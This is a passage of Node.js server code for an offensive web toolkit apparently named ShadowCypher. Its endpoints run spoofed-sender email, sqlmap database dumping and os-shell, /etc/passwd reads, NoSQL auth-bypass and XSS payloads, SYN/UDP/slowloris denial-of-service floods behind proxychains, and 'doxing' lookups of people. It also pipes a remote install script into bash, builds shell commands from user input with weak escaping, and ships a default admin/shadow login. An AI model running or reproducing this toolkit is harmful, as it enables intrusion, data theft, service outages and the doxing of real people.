        let cmd = `swaks --to "${to}" --from "${from}" --server ${srv} --header "Subject: ${subj}"`;
        if (name) cmd += ` --header "From: ${name} <${from}>"`;
        cmd += ` --body "${bdy}" --timeout 10 2>&1`;

        const out = await run(cmd, 15000);
        const success = out.includes('250 ') || out.includes('Ok');
        res.json({ success, output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// --- SPOOFING STATUS OVERVIEW ---

app.get('/api/spoof/status', async (_, res) => {
    const status = {};
    // MAC
    try {
        const iface = await getPrimaryIface();
        const current = (await run('cat /sys/class/net/' + iface + '/address 2>/dev/null')).trim();
        let permanent = '';
        try {
            const linkLine = await run('ip -o link show ' + iface + ' 2>/dev/null');
            const pm = linkLine.match(/permaddr\s+([0-9a-f:]{17})/i);
            if (pm) permanent = pm[1];
        } catch(_) {}
        if (!permanent) try { permanent = (await run('sudo ethtool -P ' + iface + ' 2>/dev/null')).replace(/.*:\s*/, '').trim(); } catch(_) {}
        const spoofed = permanent && permanent !== '00:00:00:00:00:00' && current.toLowerCase() !== permanent.toLowerCase();
        status.mac = { current, permanent, spoofed: !!spoofed, iface };
    } catch(_) { status.mac = { spoofed: false }; }
    // ARP
    try {
        const arp = await run('pgrep -a arpspoof 2>/dev/null');
        status.arp = { active: arp.trim().length > 0 };
    } catch(_) { status.arp = { active: false }; }
    // DNS
    try {
        const ett = await run('pgrep -a ettercap 2>/dev/null');
        const hosts = await run('grep SHADOWCYPHER /etc/hosts 2>/dev/null || echo ""');
        status.dns = { active: ett.trim().length > 0 || hosts.trim().length > 0 };
    } catch(_) { status.dns = { active: false }; }
    // IP forwarding
    status.ipForward = (await run('cat /proc/sys/net/ipv4/ip_forward 2>/dev/null')).trim() === '1';
    // Tools installed
    const spoofTools = {};
    for (const t of ['macchanger','arpspoof','ettercap','dnsspoof','hping3','swaks']) {
        try { await run('which ' + t); spoofTools[t] = true; } catch(_) { spoofTools[t] = false; }
    }
    status.tools = spoofTools;
    res.json(status);
});


// ═══════════ DATABASE HACKING & INJECTION ═══════════

// SQLMap full suite - database enumeration and extraction
app.post('/api/hack/sqli', requireAuth, async (req, res) => {
    const { target, action, dbms, db, table, column, tamper, technique, cookie, headers: hdrs } = req.body;
    if (!target) return res.json({ error: 'Target URL required' });
    const t = target.replace(/[;&|`$]/g, '');
    let cmd = `sqlmap -u "${t}" --batch --threads=4 --timeout=15`;
    if (dbms) cmd += ` --dbms="${dbms.replace(/[^a-zA-Z]/g, '')}"`;
    if (tamper) cmd += ` --tamper=${tamper.replace(/[^a-zA-Z0-9,_]/g, '')}`;
    if (technique) cmd += ` --technique=${technique.replace(/[^BEUST]/g, '')}`;
    if (cookie) cmd += ` --cookie="${cookie.replace(/"/g, '')}"`;
    if (hdrs) cmd += ` --headers="${hdrs.replace(/"/g, '')}"`;
    
    switch (action) {
        case 'detect': cmd += ' --level=3 --risk=2'; break;
        case 'detect-aggressive': cmd += ' --level=5 --risk=3 --random-agent'; break;
        case 'dbs': cmd += ' --dbs'; break;
        case 'tables': cmd += db ? ` -D "${db}" --tables` : ' --tables'; break;
        case 'columns': cmd += db && table ? ` -D "${db}" -T "${table}" --columns` : ' --columns'; break;
        case 'dump': 
            cmd += db && table ? ` -D "${db}" -T "${table}" --dump` : ' --dump';
            if (column) cmd += ` -C "${column}"`;
            break;
        case 'dump-all': cmd += ' --dump-all'; break;
        case 'passwords': cmd += ' --passwords'; break;
        case 'current-user': cmd += ' --current-user --current-db --hostname --is-dba'; break;
        case 'os-shell': cmd += ' --os-shell'; break;
        case 'sql-shell': cmd += ' --sql-shell'; break;
        case 'file-read': cmd += ` --file-read="${db || '/etc/passwd'}"` ; break;
        case 'waf-bypass': cmd += ' --level=5 --risk=3 --tamper=space2comment,randomcase,between,charencode,equaltolike --random-agent --hpp'; break;
        default: cmd += ' --level=3 --risk=2';
    }
    cmd += ' 2>&1 | tail -80';
    try {
        const out = await run('timeout 180 ' + cmd);
        res.json({ output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// NoSQL injection
app.post('/api/hack/nosqli', requireAuth, async (req, res) => {
    const { target, method, payload } = req.body;
    if (!target) return res.json({ error: 'Target required' });
    const t = target.replace(/[;&|`$]/g, '');
    let cmd = '';
    if (method === 'auth-bypass') {
        cmd = `curl -s -X POST "${t}" -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$ne":""}}' 2>&1 | head -50`;
    } else if (method === 'extract') {
        cmd = `curl -s -X POST "${t}" -H "Content-Type: application/json" -d '{"username":{"$regex":"^.*"},"password":{"$ne":""}}' 2>&1 | head -50`;
    } else if (method === 'enum-length') {
        cmd = `for i in $(seq 1 20); do echo -n "len=$i: "; curl -s -X POST "${t}" -H "Content-Type: application/json" -d "{\"username\":{\"\$regex\":\"^.{$i}$\"},\"password\":{\"\$ne\":\"\"}}" 2>&1 | head -1; done`;
    } else if (method === 'nosqlmap') {
        cmd = `nosqlmap -u "${t}" 2>&1 | head -60 || echo "nosqlmap not installed. pip3 install nosqlmap"`;
    } else {
        const p = payload || '{"$gt":""}';
        cmd = `curl -s -X POST "${t}" -H "Content-Type: application/json" -d '${p.replace(/'/g, "\'")}' 2>&1 | head -50`;
    }
    try {
        const out = await run('timeout 30 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
        res.json({ output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// XSS scanner
app.post('/api/hack/xss', requireAuth, async (req, res) => {
    const { target, method } = req.body;
    if (!target) return res.json({ error: 'Target required' });
    const t = target.replace(/[;&|`$]/g, '');
    let cmd = '';
    if (method === 'dalfox') {
        cmd = `dalfox url "${t}" --silence --no-color 2>&1 | head -80 || echo "dalfox not installed. go install github.com/hahwul/dalfox/v2@latest"`;
    } else if (method === 'dalfox-pipe') {
        cmd = `echo "${t}" | dalfox pipe --silence --no-color 2>&1 | head -80`;
    } else {
        cmd = `curl -sI "${t}" 2>/dev/null | head -20 && echo "---" && echo "Testing reflected XSS vectors..." && ` +
            `curl -s "${t}?q=<script>alert(1)</script>" 2>/dev/null | grep -i "script" | head -5 && ` +
            `curl -s "${t}?q=\"><img src=x onerror=alert(1)>" 2>/dev/null | grep -i "onerror" | head -5 && ` +
            `echo "Manual test: check if input is reflected unescaped"`;
    }
    try {
        const out = await run('timeout 60 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
        res.json({ output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// ═══════════ DDoS / STRESS TESTING ═══════════

app.post('/api/hack/ddos', requireAuth, async (req, res) => {
    const { target, method, duration, threads, port } = req.body;
    if (!target) return res.json({ error: 'Target required' });
    const t = target.replace(/[;&|`$]/g, '');
    const dur = Math.min(parseInt(duration) || 10, 60);
    const th = Math.min(parseInt(threads) || 100, 500);
    const p = parseInt(port) || 80;
    let cmd = '';
    switch (method) {
        case 'syn-flood': cmd = `sudo timeout ${dur} hping3 -S --flood -V -p ${p} ${t} 2>&1 | tail -20`; break;
        case 'udp-flood': cmd = `sudo timeout ${dur} hping3 --udp --flood -p ${p} ${t} 2>&1 | tail -20`; break;
        case 'icmp-flood': cmd = `sudo timeout ${dur} hping3 --icmp --flood ${t} 2>&1 | tail -20`; break;
        case 'http-flood': cmd = `timeout ${dur} ab -n 10000 -c ${th} -t ${dur} "http://${t}:${p}/" 2>&1 | tail -30`; break;
        case 'slowloris': cmd = `timeout ${dur} slowhttptest -c ${th} -H -i 10 -r 200 -t GET -u "http://${t}:${p}/" -x 24 -p 3 2>&1 | tail -30`; break;
        case 'slow-post': cmd = `timeout ${dur} slowhttptest -c ${th} -B -i 110 -r 200 -s 8192 -t POST -u "http://${t}:${p}/" -x 10 -p 3 2>&1 | tail -30`; break;
        case 'slow-read': cmd = `timeout ${dur} slowhttptest -c ${th} -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u "http://${t}:${p}/" -p 3 2>&1 | tail -30`; break;
        case 'goldeneye': cmd = `timeout ${dur} python3 /opt/GoldenEye/goldeneye.py "http://${t}:${p}/" -w ${th} -s ${dur} 2>&1 | tail -30 || echo "GoldenEye not installed. git clone https://github.com/jseidl/GoldenEye /opt/GoldenEye"` ; break;
        case 'xmas-flood': cmd = `sudo timeout ${dur} hping3 --flood -F -S -R -P -A -U -p ${p} ${t} 2>&1 | tail -20`; break;
        case 'land-attack': cmd = `sudo timeout ${dur} hping3 -S -a ${t} -p ${p} ${t} --flood 2>&1 | tail -20`; break;
        default: cmd = `echo "Methods: syn-flood, udp-flood, icmp-flood, http-flood, slowloris, slow-post, slow-read, goldeneye, xmas-flood, land-attack"`;
    }
    if (shadowMode) cmd = 'proxychains4 ' + cmd;
    try {
        const out = await run(cmd);
        res.json({ output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// ═══════════ OSINT / DOXING ═══════════

app.post('/api/hack/osint', requireAuth, async (req, res) => {
    const { target, method } = req.body;
    if (!target) return res.json({ error: 'Target required' });
    const t = target.replace(/[;&|`$"]/g, '');
    let cmd = '';
    switch (method) {
        case 'sherlock': cmd = `sherlock "${t}" --print-found --timeout 10 2>&1 | head -100 || echo "Install: pip3 install sherlock-project"`; break;
        case 'maigret': cmd = `maigret "${t}" --timeout 8 --no-recursion 2>&1 | head -100 || echo "Install: pip3 install maigret"`; break;
        case 'holehe': cmd = `holehe "${t}" 2>&1 | head -80 || echo "Install: pip3 install holehe"`; break;
        case 'theharvester': cmd = `theHarvester -d "${t}" -l 200 -b duckduckgo,bing,crtsh 2>&1 | tail -60 || echo "Install: pip3 install theHarvester"`; break;
        case 'phoneinfoga': cmd = `phoneinfoga scan -n "${t}" 2>&1 | head -60 || echo "Install: https://github.com/sundowndev/phoneinfoga/releases"`; break;
        case 'whois': cmd = `whois "${t}" 2>/dev/null`; break;
        case 'dns-all': cmd = `echo "=== A ===" && dig +short A ${t} 2>/dev/null && echo "=== AAAA ===" && dig +short AAAA ${t} 2>/dev/null && echo "=== MX ===" && dig +short MX ${t} 2>/dev/null && echo "=== NS ===" && dig +short NS ${t} 2>/dev/null && echo "=== TXT ===" && dig +short TXT ${t} 2>/dev/null && echo "=== SOA ===" && dig +short SOA ${t} 2>/dev/null && echo "=== CNAME ===" && dig +short CNAME ${t} 2>/dev/null`; break;
        case 'subdomain': cmd = `subfinder -d "${t}" -silent 2>/dev/null | head -80 || (echo "Trying crt.sh..." && curl -s "https://crt.sh/?q=%25.${t}&output=json" 2>/dev/null | python3 -c "import sys,json;[print(e['name_value']) for e in json.load(sys.stdin)]" 2>/dev/null | sort -u | head -80)`; break;
        case 'ip-lookup': cmd = `curl -s "http://ip-api.com/json/${t}" 2>/dev/null | python3 -m json.tool 2>/dev/null`; break;
        case 'email-breach': {
                const hibpKey = getIntelConfig().hibpApiKey || '';
                if (hibpKey) {
                    cmd = `curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/${t}" -H "hibp-api-key: ${hibpKey}" -H "user-agent: ShadowCypher" 2>/dev/null`;
                } else {
                    cmd = `echo "No HIBP API key configured. Set it in Intelligence > Config."; echo "Free manual check: https://haveibeenpwned.com/account/${t}"`;
                }
                break;
            }
        case 'google-dork': cmd = `echo "Google Dorks for ${t}:" && echo "  site:${t} filetype:pdf" && echo "  site:${t} filetype:sql" && echo "  site:${t} filetype:env" && echo "  site:${t} filetype:log" && echo "  site:${t} inurl:admin" && echo "  site:${t} inurl:login" && echo "  site:${t} intitle:index.of" && echo "  site:${t} ext:php intitle:phpinfo" && echo "  site:${t} inurl:wp-content" && echo "  \"${t}\" password|secret|key|token" && echo "  \"${t}\" site:pastebin.com" && echo "  \"${t}\" site:github.com password|secret"` ; break;
        case 'social-media': {
                const platforms = [
                    ['https://api.github.com/users/' + t, 'GitHub'],
                    ['https://www.reddit.com/user/' + t + '/about.json', 'Reddit'],
                    ['https://www.instagram.com/' + t + '/', 'Instagram'],
                    ['https://x.com/' + t, 'Twitter/X'],
                    ['https://www.tiktok.com/@' + t, 'TikTok'],
                    ['https://www.pinterest.com/' + t + '/', 'Pinterest'],
                    ['https://medium.com/@' + t, 'Medium'],
                    ['https://www.twitch.tv/' + t, 'Twitch'],
                    ['https://steamcommunity.com/id/' + t, 'Steam'],
                    ['https://open.spotify.com/user/' + t, 'Spotify'],
                    ['https://www.youtube.com/@' + t, 'YouTube'],
                    ['https://gitlab.com/' + t, 'GitLab'],
                ];
                let output = '=== Social Media OSINT: ' + t + ' ===\n\n';
                const checks = await Promise.allSettled(platforms.map(async ([url, name]) => {
                    try {
                        const code = await run('curl -s -o /dev/null -w "%{http_code}" -L --max-time 5 "' + url + '" 2>/dev/null', 8000);
                        return { name, url, code: code.trim() };
                    } catch(e) { return { name, url, code: 'err' }; }
                }));
                for (const r of checks) {
                    if (r.status !== 'fulfilled') continue;
                    const { name, url, code } = r.value;
                    if (code === '200') output += '[FOUND] ' + name + ' (' + code + ') -> ' + url + '\n';
                    else if (code === '404') output += '[  -  ] ' + name + ' (' + code + ')\n';
                    else output += '[ ??? ] ' + name + ' (' + code + ')\n';
                }
                return res.json({ output });
            }
        case 'reverse-image': cmd = `echo "Reverse Image Search for: ${t}" && echo "" && echo "Google Lens: https://lens.google.com/uploadbyurl?url=${t}" && echo "Yandex Images: https://yandex.com/images/search?rpt=imageview&url=${t}" && echo "TinEye: https://tineye.com/search?url=${t}" && echo "" && echo "--- Metadata extraction ---" && curl -sI "${t}" 2>/dev/null | grep -iE "content-type|content-length|last-modified|etag" && exiftool <(curl -s "${t}" 2>/dev/null) 2>/dev/null | head -20 || echo "Could not fetch image metadata"`; break;
        default: cmd = `echo "Methods: sherlock, maigret, holehe, theharvester, phoneinfoga, whois, dns-all, subdomain, ip-lookup, email-breach, google-dork, social-media, reverse-image"`;
    }
    try {
        const out = await run('timeout 60 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
        res.json({ output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// Install OSINT tools
app.post('/api/hack/install-osint', requireAuth, async (req, res) => {
    const { tool } = req.body;
    const map = {
        'sherlock': 'pip3 install sherlock-project',
        'maigret': 'pip3 install maigret',
        'holehe': 'pip3 install holehe',
        'theharvester': 'pip3 install theHarvester',
        'dalfox': 'go install github.com/hahwul/dalfox/v2@latest',
        'nosqlmap': 'pip3 install nosqlmap',
        'goldeneye': 'sudo git clone https://github.com/jseidl/GoldenEye /opt/GoldenEye 2>/dev/null && echo "Installed to /opt/GoldenEye"',
        'phoneinfoga': 'curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash',
        'all-osint': 'pip3 install sherlock-project maigret holehe theHarvester 2>&1 | tail -10',
    };
    if (!tool || !map[tool]) return res.json({ error: 'Unknown: ' + tool });
    try {
        const out = await run(map[tool] + ' 2>&1 | tail -15');
        res.json({ output: out.trim(), success: true });
    } catch (e) { res.json({ error: e.message }); }
});


// Load Intelligence Operations Center module
require('./intel-ops')(app, requireAuth, run, fs, path, wss);

// Start server
server.listen(PORT, () => {
    console.log(`\nShadowCypher running on http://localhost:${PORT}`);
    console.log(`Default login: admin / shadow`);
});
